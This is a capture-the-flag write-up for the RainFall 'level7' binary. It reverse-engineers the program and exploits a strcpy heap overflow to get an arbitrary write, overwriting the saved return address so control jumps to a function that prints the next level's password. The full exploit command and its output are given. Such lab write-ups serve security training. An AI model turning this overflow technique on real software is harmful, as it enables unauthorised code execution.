# level7

Initial analysis using `objdump` :

```
level7@RainFall:~$ objdump -Mintel -d level7 

level7:     file format elf32-i386

...
080484f4 <m>:
 80484f4:	55                   	push   ebp
 80484f5:	89 e5                	mov    ebp,esp
 80484f7:	83 ec 18             	sub    esp,0x18
 80484fa:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    edx,0x80486e0
 804850b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 804850f:	c7 44 24 04 60 99 04 	mov    DWORD PTR [esp+0x4],0x8049960
 8048516:	08 
 8048517:	89 14 24             	mov    DWORD PTR [esp],edx
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret    

08048521 <main>:
 8048521:	55                   	push   ebp
 8048522:	89 e5                	mov    ebp,esp
 8048524:	83 e4 f0             	and    esp,0xfffffff0
 8048527:	83 ec 20             	sub    esp,0x20
 804852a:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
 8048536:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 804853a:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 804853e:	c7 00 01 00 00 00    	mov    DWORD PTR [eax],0x1
 8048544:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
 8048550:	89 c2                	mov    edx,eax
 8048552:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048556:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
 8048559:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
 8048565:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 8048569:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 804856d:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2
 8048573:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
 804857f:	89 c2                	mov    edx,eax
 8048581:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 8048585:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
 8048588:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804858b:	83 c0 04             	add    eax,0x4
 804858e:	8b 00                	mov    eax,DWORD PTR [eax]
 8048590:	89 c2                	mov    edx,eax
 8048592:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048596:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
 8048599:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804859d:	89 04 24             	mov    DWORD PTR [esp],eax
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>
 80485a5:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80485a8:	83 c0 08             	add    eax,0x8
 80485ab:	8b 00                	mov    eax,DWORD PTR [eax]
 80485ad:	89 c2                	mov    edx,eax
 80485af:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80485b3:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
 80485b6:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485ba:	89 04 24             	mov    DWORD PTR [esp],eax
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
 80485c2:	ba e9 86 04 08       	mov    edx,0x80486e9
 80485c7:	b8 eb 86 04 08       	mov    eax,0x80486eb
 80485cc:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485d0:	89 04 24             	mov    DWORD PTR [esp],eax
 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
 80485d8:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80485dc:	c7 44 24 04 44 00 00 	mov    DWORD PTR [esp+0x4],0x44
 80485e3:	00 
 80485e4:	c7 04 24 60 99 04 08 	mov    DWORD PTR [esp],0x8049960
 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
 80485f0:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
 80485fc:	b8 00 00 00 00       	mov    eax,0x0
 8048601:	c9                   	leave  
 8048602:	c3                   	ret    
 8048603:	90                   	nop
 8048604:	90                   	nop
 8048605:	90                   	nop
 8048606:	90                   	nop
 8048607:	90                   	nop
 8048608:	90                   	nop
 8048609:	90                   	nop
 804860a:	90                   	nop
 804860b:	90                   	nop
 804860c:	90                   	nop
 804860d:	90                   	nop
 804860e:	90                   	nop
 804860f:	90                   	nop
...
```

This time, the main function is pretty stuffy. We can help ourselves with **Ghidra** and reconstruct the following C program :

```c
int main(int argc,char **argv)

{
  uint32_t *var1;
  void *tmp;
  uint32_t *var2;
  FILE *fp;
  
  var1 = (uint32_t *)malloc(8);
  *var1 = 1;
  tmp = malloc(8);
  var1[1] = (uint32_t)tmp;
  var2 = (uint32_t *)malloc(8);
  *var2 = 2;
  tmp = malloc(8);
  var2[1] = (uint32_t)tmp;

  strcpy((char *)var1[1],argv[1]);
  strcpy((char *)var2[1],argv[2]);

  fp = fopen("/home/user/level8/.pass","r");

  fgets(c,0x44,fp);
  puts("~~");

  return 0;
}
```

This programs takes two argument. `strcpy` copies the user supplied arguments, into the address contained in `var[1]` and the address contained in `var[2]` respectively. Do note that `var[1]` and `var[2]` contains malloc'ed addresses that can safely hold **at most** 8 bytes.

It then process to dump the content of the flag at the path `/home/user/level8/.pass` into the global variable `c`. This most likely will be the area that we want to read. It turns out that the `m` function is doing exactly just that :

```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  time_t myTime;
  
  myTime = time((time_t *)0x0);
  printf("%s - %d\n",c,myTime);
  return;
}
```

It is evident that we can **overflow** these buffers because the unsafe `strcpy` is used. Let's inspect the heap at runtime with **GDB**.

```
level7@RainFall:~$ gdb level7
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   ...
End of assembler dump.
(gdb) b *0x080485a0
Breakpoint 1 at 0x80485a0
(gdb) r
Starting program: /home/user/level7/level7 

Breakpoint 1, 0x080485a0 in main ()
(gdb) x/1wx $esp+0x1c
0xbffff72c:	0x0804a008
(gdb) x/20wx 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can clearly see the content of `var1` (`0x804a008`) and `var2` (`0x804a028`). What is interesting is the fact that `var[1]` contains the address `0x0804a018`, which is adjacent and just before the memory block of `var2`. Now, let's put some data into those buffers :

```
(gdb) b *0x080485c2
Breakpoint 2 at 0x80485c2
(gdb) d 1
(gdb) r aaaaaaaa bbbbbbbb
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 aaaaaaaa bbbbbbbb

Breakpoint 2, 0x080485c2 in main ()
(gdb) x/20wx 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x61616161	0x61616161	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x62626262	0x62626262	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can remark that, if we overflow the buffer at address `0x804a018`, we can actually write arbitrary content in `var2`. If we overwrite `var2[1]`, we can gain the ability to perform arbitrary writes on the whole address space of the process : 

```c
// First strcpy, we can overwrite the address stored in var2[1].
strcpy((char *)var1[1],argv[1]);
// Second strcpy, var2[1] now contains the address we want to write to, and argv[2] the content.
strcpy((char *)var2[1],argv[2]);
```

We need to write **20 dummy bytes**, and then our address of choice in `argv[1]`.

```
(gdb) b *0x080485bd
Breakpoint 3 at 0x80485bd
(gdb) d 2
(gdb) r $(python -c 'print("a"*20 + "\xEF\xBE\xAD\xDE")') bbbbbbbb
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 $(python -c 'print("a"*20 + "\xEF\xBE\xAD\xDE")') bbbbbbbb

Breakpoint 3, 0x080485bd in main ()
(gdb) x/20wx 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x61616161	0x61616161	0x61616161	0x61616161
0x804a028:	0x61616161	0xdeadbeef	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```

The second `strcpy` would be equivalent to the following :

```c
strcpy(0xDEADBEEF, "bbbbbbbb");
```

## Putting it together

We have know gain the ability to write an **arbitrary value** at an **abitrary address**. Since the function `m` is printing our flag, we would like to execute this function.

Remembering that `main` is a function called by the *C standard library*, we can know for sure that a **saved EIP** is on the stack. Closer inspection with **GDB** confirms this :

```
(gdb) b *0x080485bd
Breakpoint 1 at 0x80485bd
(gdb) r a b
Starting program: /home/user/level7/level7 a b

Breakpoint 1, 0x080485bd in main ()
(gdb) x/30xw $esp
0xbffff710:	0x0804a038	0xbffff913	0xb7fd0ff4	0xb7e5ee55
0xbffff720:	0xb7fed280	0x00000000	0x0804a028	0x0804a008
0xbffff730:	0x08048610	0x00000000	0x00000000	0xb7e454d3 <--
0xbffff740:	0x00000003	0xbffff7d4	0xbffff7e4	0xb7fdc858
0xbffff750:	0x00000000	0xbffff71c	0xbffff7e4	0x00000000
0xbffff760:	0x0804825c	0xb7fd0ff4	0x00000000	0x00000000
0xbffff770:	0x00000000	0xfbe8aef5	0xccaf0ae5	0x00000000
0xbffff780:	0x00000000	0x00000000

(gdb) x/10i 0xb7e454d3
   0xb7e454d3 <__libc_start_main+243>:	mov    DWORD PTR [esp],eax
   0xb7e454d6 <__libc_start_main+246>:	call   0xb7e5ebe0 <exit>
   0xb7e454db <__libc_start_main+251>:	xor    ecx,ecx
   0xb7e454dd <__libc_start_main+253>:	jmp    0xb7e45414 <__libc_start_main+52>
   0xb7e454e2 <__libc_start_main+258>:	mov    eax,DWORD PTR [ebx+0x3934]
   0xb7e454e8 <__libc_start_main+264>:	ror    eax,0x9
   0xb7e454eb <__libc_start_main+267>:	xor    eax,DWORD PTR gs:0x18
   0xb7e454f2 <__libc_start_main+274>:	call   eax
   0xb7e454f4 <__libc_start_main+276>:	mov    eax,DWORD PTR [ebx+0x392c]
   0xb7e454fa <__libc_start_main+282>:	ror    eax,0x9
```

The return address is stored at address `0xBFFFF73C`. We know **where** we have to write to, but we do not know **what** we have to write yet. We want to jump to the `m` function, so we need his virtual address :

```
(gdb) info function ^m$
All functions matching regular expression "^m$":

Non-debugging symbols:
0x080484F4  m
```

This lead to the following exploit :

```
$(python -c 'print("a"*20 + "\x3C\xF7\xFF\xBF")') $(python -c 'print("\xF4\x84\x04\x08")')
```

Once main's `ret` instruction is executed, the control flow will be hijack to the `m` function :

```
level7@RainFall:~$ ./level7 $(python -c 'print("a"*20 + "\x3C\xF7\xFF\xBF")') $(python -c 'print("\xF4\x84\x04\x08")')
~~
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1738679527
Segmentation fault (core dumped)
```

Success !